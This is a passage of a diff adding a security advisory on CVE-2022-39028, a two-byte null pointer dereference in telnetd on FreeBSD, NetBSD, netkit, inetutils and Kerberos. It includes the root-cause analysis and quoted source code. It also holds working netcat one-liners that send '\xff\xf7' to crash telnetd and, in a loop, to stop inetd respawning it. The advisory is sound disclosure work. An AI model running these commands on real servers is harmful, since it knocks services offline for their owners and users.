++                                   if (slctab[SLC_EC].sptr)
++                                           ch = *slctab[SLC_EC].sptr;
++                           }
+                            else
+-                                   ch = *slctab[SLC_EL].sptr;
++                           {
++                                   if (slctab[SLC_EL].sptr)
++                                           ch = *slctab[SLC_EL].sptr;
++                           }
+                            if (ch != (cc_t)(_POSIX_VDISABLE))
+                                    *pfrontp++ = (unsigned char)ch;
+                            break;
+</code></pre>
+<p><a id="remote-dos-analysis"></a></p>
+<h3>Analysis of the "normal" execution path</h3>
+<p>In this section, we used the sources found in FreeBSD 13.1 but the root cause is similar with any previously listed <code>telnetd</code>.</p>
+<p>When reviewing the code, the "normal" execution flow to correctly initialize the <code>slctab[31]</code> array is:</p>
+<pre><code>main() -&gt; doit() -&gt; telnet() -&gt; get_slc_defaults()
+</code></pre>
+<p>In the <code>telnet()</code> function, there is a call to <code>get_slc_defaults()</code> on line 747:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">723</span> <span style="color: #408080; font-style: italic">/*</span>
+<span style="color: #408080; font-style: italic">724  * Main loop.  Select from pty and network, and</span>
+<span style="color: #408080; font-style: italic">725  * hand data to telnet receiver finite state machine.</span>
+<span style="color: #408080; font-style: italic">726  */</span>
+<span style="color: #666666">727</span> <span style="color: #B00040">void</span>
+<span style="color: #666666">728</span> telnet(<span style="color: #B00040">int</span> f, <span style="color: #B00040">int</span> p, <span style="color: #B00040">char</span> <span style="color: #666666">*</span>host)
+<span style="color: #666666">729</span> {
+...
+<span style="color: #666666">743</span>
+<span style="color: #666666">744</span>         <span style="color: #408080; font-style: italic">/*</span>
+<span style="color: #408080; font-style: italic">745          * Initialize the slc mapping table.</span>
+<span style="color: #408080; font-style: italic">746          */</span>
+<span style="color: #666666">747</span>         get_slc_defaults();
+...
+<span style="color: #666666">797</span>         <span style="color: #008000; font-weight: bold">while</span> (his_will_wont_is_changing(TELOPT_NAWS))
+<span style="color: #666666">798</span>                 ttloop();
+...
+<span style="color: #666666">811</span>         <span style="color: #008000; font-weight: bold">if</span> (his_want_state_is_will(TELOPT_ECHO) <span style="color: #666666">&amp;&amp;</span>
+<span style="color: #666666">812</span>             his_state_is_will(TELOPT_NAWS)) {
+<span style="color: #666666">813</span>                 <span style="color: #008000; font-weight: bold">while</span> (his_will_wont_is_changing(TELOPT_ECHO))
+<span style="color: #666666">814</span>                         ttloop();
+</pre></div>
+
+<p>After <code>get_slc_defaults()</code>, there are multiple calls to the <code>ttloop()</code> function (lines 798 and 814). This is the normal behavior.</p>
+<p>The function <code>get_slc_defaults()</code> defined in <code>slc.c</code> is used to correctly initialize the <code>slctab[31]</code> array.</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">99</span> <span style="color: #408080; font-style: italic">/*</span>
+<span style="color: #408080; font-style: italic">100  * get_slc_defaults</span>
+<span style="color: #408080; font-style: italic">101  *</span>
+<span style="color: #408080; font-style: italic">102  * Initialize the slc mapping table.</span>
+<span style="color: #408080; font-style: italic">103  */</span>
+<span style="color: #666666">104</span> <span style="color: #B00040">void</span>
+<span style="color: #666666">105</span> get_slc_defaults(<span style="color: #B00040">void</span>)
+<span style="color: #666666">106</span> {
+<span style="color: #666666">107</span>         <span style="color: #B00040">int</span> i;
+<span style="color: #666666">108</span> 
+<span style="color: #666666">109</span>         <span style="color: #0000FF">init_termbuf</span>();
+<span style="color: #666666">110</span> 
+<span style="color: #666666">111</span>         <span style="color: #008000; font-weight: bold">for</span> (i <span style="color: #666666">=</span> <span style="color: #666666">1</span>; i <span style="color: #666666">&lt;=</span> NSLC; i<span style="color: #666666">++</span>) {
+<span style="color: #666666">112</span>                 slctab[i].defset.flag <span style="color: #666666">=</span>
+<span style="color: #666666">113</span>                         spcset(i, <span style="color: #666666">&amp;</span>slctab[i].defset.val, <span style="color: #666666">&amp;</span>slctab[i].sptr);
+<span style="color: #666666">114</span>                 slctab[i].current.flag <span style="color: #666666">=</span> SLC_NOSUPPORT;
+<span style="color: #666666">115</span>                 slctab[i].current.val <span style="color: #666666">=</span> <span style="color: #666666">0</span>;
+<span style="color: #666666">116</span>         }
+<span style="color: #666666">117</span> 
+<span style="color: #666666">118</span> }  <span style="color: #408080; font-style: italic">/* end of get_slc_defaults */</span>
+</pre></div>
+
+<p>Interestingly, the initialization starts from 1.</p>
+<p><code>NSLC</code> is defined in <code>../arpa/telnet.h</code>:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>    <span style="color: #666666">216</span> <span style="border: 1px solid #FF0000">#</span>define NSLC            <span style="color: #666666">30</span>
+</pre></div>
+
+<p>You can review the <code>spcset()</code> <a href="https://github.com/freebsd/freebsd-src/blob/main/contrib/telnet/telnetd/sys_term.c#L285">function here</a>.</p>
+<p>The <code>slctab</code> global variable, an array of 31 <code>slcfun</code> structures, is defined in the <code>ext.h</code> file:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>     <span style="color: #666666">63</span> EXTERN slcfun   slctab[NSLC <span style="color: #666666">+</span> <span style="color: #666666">1</span>];       <span style="color: #408080; font-style: italic">/* slc mapping table */</span>
+</pre></div>
+
+<p>And the <code>slcfun</code> structure is defined in the <code>defs.h</code> file:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">99</span> <span style="border: 1px solid #FF0000">#</span><span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">!</span>defined(USE_TERMIO) <span style="color: #666666">||</span> defined(NO_CC_T)
+<span style="color: #666666">100</span> <span style="color: #008000; font-weight: bold">typedef</span> <span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span> cc_t;
+<span style="color: #666666">101</span> <span style="border: 1px solid #FF0000">#</span>endif
+...
+<span style="color: #666666">152</span> <span style="color: #408080; font-style: italic">/*</span>
+<span style="color: #408080; font-style: italic">153  * Structures of information for each special character function.</span>
+<span style="color: #408080; font-style: italic">154  */</span>
+<span style="color: #666666">155</span> <span style="color: #008000; font-weight: bold">typedef</span> <span style="color: #008000; font-weight: bold">struct</span> {
+<span style="color: #666666">156</span>         <span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>   flag;           <span style="color: #408080; font-style: italic">/* the flags for this function */</span>
+<span style="color: #666666">157</span>         cc_t            val;            <span style="color: #408080; font-style: italic">/* the value of the special character */</span>
+<span style="color: #666666">158</span> } slcent, <span style="color: #666666">*</span>Slcent;
+<span style="color: #666666">159</span>
+<span style="color: #666666">160</span> <span style="color: #008000; font-weight: bold">typedef</span> <span style="color: #008000; font-weight: bold">struct</span> {
+<span style="color: #666666">161</span>         slcent          defset;         <span style="color: #408080; font-style: italic">/* the default settings */</span>
+<span style="color: #666666">162</span>         slcent          current;        <span style="color: #408080; font-style: italic">/* the current settings */</span>
+<span style="color: #666666">163</span>         cc_t            <span style="color: #666666">*</span>sptr;          <span style="color: #408080; font-style: italic">/* a pointer to the char in */</span>
+<span style="color: #666666">164</span>                                         <span style="color: #408080; font-style: italic">/* system data structures */</span>
+<span style="color: #666666">165</span> } slcfun, <span style="color: #666666">*</span>Slcfun;
+</pre></div>
+
+<p>Because <code>slctab</code> is a global variable, all its fields are initialized to <code>0</code> by default.</p>
+<p>Using <code>readelf</code>, we can confirm <code>slctab</code> is a global variable:</p>
+<pre><code>root@freebsd-13-1p1:~ # readelf -a /usr/libexec/telnetd
+Symbol table (.symtab) contains 616 entries:
+   Num:    Value          Size Type    Bind   Vis      Ndx Name
+...
+   187: 0000000000022730   496 OBJECT  GLOBAL DEFAULT   27 slctab
+</code></pre>
+<p><a id="remote-dos-root-cause-analysis"></a></p>
+<h2>Root cause analysis of the crashes</h2>
+<p>When reviewing the code, the execution flow leading to segfaults is:</p>
+<pre><code>main() -&gt; doit() -&gt; getterminaltype() -&gt; ttloop() -&gt; telrcv() -&gt; Access to *(slctab[10].sptr) or *(slctab[11].sptr).
+</code></pre>
+<p>In the <code>doit()</code> function, there is a call to <code>getterminaltype()</code> on line 715 and then to <code>telnet()</code> on line 718:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>    <span style="color: #666666">652</span> <span style="color: #408080; font-style: italic">/*</span>
+<span style="color: #408080; font-style: italic">    653  * Get a pty, scan input lines.</span>
+<span style="color: #408080; font-style: italic">    654  */</span>
+    <span style="color: #666666">655</span> <span style="color: #B00040">void</span>
+    <span style="color: #666666">656</span> doit(<span style="color: #008000; font-weight: bold">struct</span> sockaddr <span style="color: #666666">*</span>who)
+    <span style="color: #666666">657</span> {
+...
+    <span style="color: #666666">715</span>         level <span style="color: #666666">=</span> getterminaltype(user_name);
+...
+    <span style="color: #666666">718</span>         telnet(net, pty, remote_hostname);      <span style="color: #408080; font-style: italic">/* begin server process */</span>
+</pre></div>
+
+<p>Analyzing <code>getterminaltype()</code> reveals that there are multiple calls to the <code>ttloop()</code> function (on line 481 when compiled with <code>-DAUTHENTICATION</code> and on line 505 by default):</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">468</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span>
+<span style="color: #666666">469</span> <span style="color: #0000FF">getterminaltype</span>(<span style="color: #B00040">char</span> <span style="color: #666666">*</span>name undef2)
+<span style="color: #666666">470</span> {
+...
+<span style="color: #666666">474</span> <span style="border: 1px solid #FF0000">#</span>ifdef  AUTHENTICATION
+...
+<span style="color: #666666">481</span>             ttloop();
+...
+<span style="color: #666666">486</span> <span style="border: 1px solid #FF0000">#</span>endif
+...
+<span style="color: #666666">496</span>     <span style="color: #008000; font-weight: bold">while</span> (
+<span style="color: #666666">497</span> <span style="border: 1px solid #FF0000">#</span>ifdef  ENCRYPTION
+<span style="color: #666666">498</span>            his_do_dont_is_changing(TELOPT_ENCRYPT) <span style="color: #666666">||</span>
+<span style="color: #666666">499</span> <span style="border: 1px solid #FF0000">#</span>endif  <span style="color: #408080; font-style: italic">/* ENCRYPTION */</span>
+<span style="color: #666666">500</span>            his_will_wont_is_changing(TELOPT_TTYPE) <span style="color: #666666">||</span>
+<span style="color: #666666">501</span>            his_will_wont_is_changing(TELOPT_TSPEED) <span style="color: #666666">||</span>
+<span style="color: #666666">502</span>            his_will_wont_is_changing(TELOPT_XDISPLOC) <span style="color: #666666">||</span>
+<span style="color: #666666">503</span>            his_will_wont_is_changing(TELOPT_NEW_ENVIRON) <span style="color: #666666">||</span>
+<span style="color: #666666">504</span>            his_will_wont_is_changing(TELOPT_OLD_ENVIRON)) {
+<span style="color: #666666">505</span>         ttloop();
+<span style="color: #666666">506</span>     }
+</pre></div>
+
+<p>The <code>ttloop()</code> function will then call <code>telrcv()</code>:</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">66</span>     <span style="color: #B00040">void</span>
+<span style="color: #666666">67</span> <span style="color: #0000FF">ttloop</span>()
+<span style="color: #666666">68</span> {
+...
+<span style="color: #666666">69</span>
+<span style="color: #666666">74</span>     ncc <span style="color: #666666">=</span> read(net, netibuf, <span style="color: #008000; font-weight: bold">sizeof</span> netibuf);
+...
+<span style="color: #666666">84</span>     telrcv();                   <span style="color: #408080; font-style: italic">/* state machine */</span>
+<span style="color: #666666">85</span>     <span style="color: #008000; font-weight: bold">if</span> (ncc <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {
+<span style="color: #666666">86</span>         pfrontp <span style="color: #666666">=</span> pbackp <span style="color: #666666">=</span> ptyobuf;
+<span style="color: #666666">87</span>         telrcv();
+<span style="color: #666666">88</span>     }
+<span style="color: #666666">89</span> }  <span style="color: #408080; font-style: italic">/* end of ttloop */</span>
+</pre></div>
+
+<p>At this moment, the function <code>get_slc_defaults()</code> has still not been executed to correctly initialize the <code>slctab[31]</code> array.
+All the fields in the <code>slctab[31]</code> array are still set to <code>0</code>.</p>
+<p>Then in the <code>telrcv()</code> function, when an attacker sends <code>\xff\xf7</code> or <code>\xff\xf8</code>, the code will try to access <code>*(slctab[10].sptr)</code> (<code>*(0)</code>) or <code>*(slctab[11].sptr)</code> (<code>*(0)</code>), we have null pointer dereferences!</p>
+<p><a id="remote-dos-macos"></a></p>
+<h3>MacOS</h3>
+<p>We also found the vulnerable function in MacOS source codes at <a href="https://opensource.apple.com/source/KerberosLibraries/KerberosLibraries-81.46.1/KerberosFramework/Kerberos5/Sources/appl/telnet/telnetd/state.c">https://opensource.apple.com/source/KerberosLibraries/KerberosLibraries-81.46.1/KerberosFramework/Kerberos5/Sources/appl/telnet/telnetd/state.c</a>, but macOS does not appear to provide a telnetd binary so we can assume it is not affected.</p>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">98</span>         <span style="color: #B00040">void</span>
+ <span style="color: #666666">99</span> <span style="color: #0000FF">telrcv</span>()
+<span style="color: #666666">100</span> {
+<span style="color: #666666">101</span>         <span style="color: #008000; font-weight: bold">register</span> <span style="color: #B00040">int</span> c;
+<span style="color: #666666">102</span>         <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span> state <span style="color: #666666">=</span> TS_DATA;
+<span style="color: #666666">103</span> <span style="border: 1px solid #FF0000">#</span><span style="color: #008000; font-weight: bold">if</span>     defined(CRAY2) <span style="color: #666666">&amp;&amp;</span> defined(UNICOS5)
+<span style="color: #666666">104</span>         <span style="color: #B00040">char</span> <span style="color: #666666">*</span>opfrontp <span style="color: #666666">=</span> pfrontp;
+<span style="color: #666666">105</span> <span style="border: 1px solid #FF0000">#</span>endif
+...
+<span style="color: #666666">107</span>         <span style="color: #008000; font-weight: bold">while</span> (ncc <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {
+<span style="color: #666666">108</span>                 <span style="color: #008000; font-weight: bold">if</span> ((<span style="color: #666666">&amp;</span>ptyobuf[BUFSIZ] <span style="color: #666666">-</span> pfrontp) <span style="color: #666666">&lt;</span> <span style="color: #666666">1</span>)
+<span style="color: #666666">109</span>                         <span style="color: #008000; font-weight: bold">break</span>;
+<span style="color: #666666">110</span>                 c <span style="color: #666666">=</span> <span style="color: #666666">*</span>netip<span style="color: #666666">++</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0377</span>, ncc<span style="color: #666666">--</span>;
+...
+<span style="color: #666666">115</span>                 <span style="color: #008000; font-weight: bold">switch</span> (state) {
+...
+<span style="color: #666666">125</span>                 <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_DATA</span>:
+<span style="color: #666666">126</span>                         <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> IAC) {
+<span style="color: #666666">127</span>                                 state <span style="color: #666666">=</span> TS_IAC;
+<span style="color: #666666">128</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
+<span style="color: #666666">129</span>                         }
+...
+<span style="color: #666666">169</span>                 <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_IAC</span>:
+<span style="color: #666666">170</span> <span style="color: #A0A000">gotiac</span>:                 <span style="color: #008000; font-weight: bold">switch</span> (c) {
+...
+<span style="color: #666666">221</span>                         <span style="color: #408080; font-style: italic">/*</span>
+<span style="color: #408080; font-style: italic">222                          * Erase Character and</span>
+<span style="color: #408080; font-style: italic">223                          * Erase Line</span>
+<span style="color: #408080; font-style: italic">224                          */</span>
+<span style="color: #666666">225</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>:
+<span style="color: #666666">226</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>:
+<span style="color: #666666">227</span>                             {
+<span style="color: #666666">228</span>                                 cc_t ch;
+<span style="color: #666666">229</span> 
+<span style="color: #666666">230</span>                                 DIAG(TD_OPTIONS,
+<span style="color: #666666">231</span>                                         printoption(<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
+<span style="color: #666666">232</span>                                 ptyflush();     <span style="color: #408080; font-style: italic">/* half-hearted */</span>
+<span style="color: #666666">233</span>                                 init_termbuf();
+<span style="color: #666666">234</span>                                 <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> EC)
+<span style="color: #666666">235</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
+<span style="color: #666666">236</span>                                 <span style="color: #008000; font-weight: bold">else</span>
+<span style="color: #666666">237</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
+<span style="color: #666666">238</span>                                 <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t)(_POSIX_VDISABLE))
+<span style="color: #666666">239</span>                                         <span style="color: #666666">*</span>pfrontp<span style="color: #666666">++</span> <span style="color: #666666">=</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>)ch;
+<span style="color: #666666">240</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
+<span style="color: #666666">241</span>                             }
+</pre></div>
+
+<p><a id="remote-dos-conclusion"></a></p>
+<h3>Conclusion</h3>
+<p>There is a vulnerable code path reachable from the network allowing an attacker to force the server using variables before they are correctly initialized, resulting in 2 null pointer dereferences.</p>
+<p>From our tests, it was determined these 2 vulnerabilities affect:</p>
+<ul>
+<li>FreeBSD-telnetd</li>
+<li>NetBSD-telnetd</li>
+<li>inetutils-telnetd</li>
+<li>netkit-telnetd</li>
+<li>Telnetd in Kerberos Version 5 Applications - since the initial version (February 22, 1991 or 1/21/93)</li>
+<li>specific Palo Alto appliances (using netkit-telnetd)</li>
+<li>specific Cisco appliances (using netkit-telnetd)</li>
+<li>specific Brocade appliances (using netkit-telnetd)</li>
+<li>specific Arista appliances (using netkit-telnetd)</li>
+<li>...</li>
+</ul>
+<p>These vulnerabilities existed for =~ 30 years.</p>
+<p>To check if a remote telnet server is vulnerable, it is possible to send 2 bytes over the network and check if the remote server closes the TCP connection.</p>
+<p>A disconnection means the remote <code>telnetd</code> processus likely crashed.</p>
+<p><a id="permanent-remote-dos"></a></p>
+<h2>Details - permanent Remote DoS</h2>
+<p>Since <code>telnetd</code> is started with <code>inetd</code>, a new <code>telnetd</code> process will be spawned for each new tcp connection.</p>
+<p>So an attacker can crash 256 <code>telnetd</code> processes very quickly and then <code>inetd</code> will stop spawning new telnetd processes. This DoS takes 4 seconds on a recent machine. This test was done under FreeBSD:</p>
+<pre><code>kali% i=0; while true; do echo $i; printf "\xff\xf7" | nc -n -v 192.168.1.200 23 &gt;/dev/null; i=$((${i}+1));done
+0
+(UNKNOWN) [192.168.1.200] 23 (telnet) open
+1
+(UNKNOWN) [192.168.1.200] 23 (telnet) open
+2
+...
+(UNKNOWN) [192.168.1.200] 23 (telnet) open
+256
+(UNKNOWN) [192.168.1.200] 23 (telnet) : Connection refused
+257
+(UNKNOWN) [192.168.1.200] 23 (telnet) : Connection refused
+...
+</code></pre>
+<p>And in the logs, we can confirm the telnetd server will not be spawned anymore by inetd:</p>
+<pre><code>Aug 21 12:01:40 freebsd-13-1p1 inetd[6550]: telnet/tcp server failing (looping), service terminated
+</code></pre>
+<p><a id="full-disclosure"></a></p>
+<h2>Vendor Response</h2>
+<p>Reaching and coordinating with all the vendors and software maintainers will take too much time and effort.</p>
+<p>Full-disclosure is applied.</p>
+<p><a id="recommendations"></a></p>
+<h2>Recommendations</h2>
+<p>It is 2022. Do not use telnet. Seriously!</p>
+<p><a id="bggp3-score"></a></p>
+<h2>BGGP #3 Score</h2>
+<p>Rules of BGGP #3 are available at <a href="https://tmpout.sh/bggp/3/">https://tmpout.sh/bggp/3/</a>.</p>
+<p>Calculation of the score:</p>
+<pre><code>  4096 pts
+ -   2 pts (size of file or payload)
+ +1024 pts, if you submit a writeup about your process and details about the crash
+(+4096 pts, if you author a patch for your bug which is merged before the end of the competition)
+------
+  9214 pts if patches are deployed.
+</code></pre>
+<p>There are other bonus that we cannot obtain with these vulnerabilities:</p>
+<pre><code> +1024 pts, if the program counter is all 3's when the program crashes
+ +2048 pts, if you hijack execution and print or return "3"
+</code></pre>
+<p>We cannot hijack the execution flow but we can print "3" for fun over the telnet connection.</p>
+<p>We can use RFC 857 (telnet echo) with <code>IAC WILL ECHO</code> (<code>255 251 1</code>) or <code>IAC DO ECHO</code> (<code>255 253 1</code>) and then crash the remote server.</p>
+<p>But we found a smaller payload by sending <code>255 251 3</code> (this will print "3") and then <code>255 247</code> (DoS):</p>
+<pre><code>kali% (printf "\xff\xfb3"; sleep 1; printf "\xff\xf7") | nc -v -n 192.168.1.200 23
+(UNKNOWN) [192.168.1.200] 23 (telnet) open
+&lt;FF&gt;&lt;FD&gt;%&lt;FF&gt;&lt;FE&gt;3
+</code></pre>
+<p><a id="credits"></a></p>
+<h2>Credits</h2>
+<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>) and Alexandre Torres (<a href="https://twitter.com/AlexTorSec">@AlexTorSec</a>).</p>
+<p><a id="references"></a></p>
+<h2>References</h2>
+<p><a href="https://pierrekim.github.io/blog/2022-08-24-2-byte-dos-freebsd-netbsd-telnetd-netkit-telnetd-inetutils-telnetd-kerberos-telnetd.html">https://pierrekim.github.io/blog/2022-08-24-2-byte-dos-freebsd-netbsd-telnetd-netkit-telnetd-inetutils-telnetd-kerberos-telnetd.html</a></p>
+<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-39028">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-39028</a></p>
+<p><a id="disclaimer"></a></p>
+<h2>Disclaimer</h2>
+<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a>.</p></content>
+    </entry>
+    
+    <entry>
         <title>Multiple vulnerabilities in Dell OpenManage Enterprise</title>
         <link href="2021-07-19-dell-openmanage-enterprise-0day-vulnerabilities.html"/>
         <content type="html"><h2>Product description</h2>
